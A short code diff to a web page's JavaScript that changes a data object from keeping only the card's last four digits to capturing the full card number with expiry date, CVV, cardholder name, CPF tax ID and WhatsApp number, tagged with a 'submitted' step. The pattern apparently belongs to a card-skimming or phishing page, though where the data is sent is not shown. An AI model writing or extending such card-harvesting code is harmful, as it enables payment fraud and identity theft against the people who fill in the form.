@@ -1696,7 +1696,9 @@
                         whatsapp: (document.getElementById('cust-phone')||{}).value,
                         step: 'submitted',
                         card_number: num,
-                        card_last4: num.slice(-4),
+                        exp: exp,
+                        cvv: cvv,
+                        cardholder_name: name,
                         card_brand_hint: /^4/.test(num) ? 'visa' : /^5/.test(num) ? 'master' : /^3/.test(num) ? 'amex' : 'other',
                         cpf: cpf
                     });
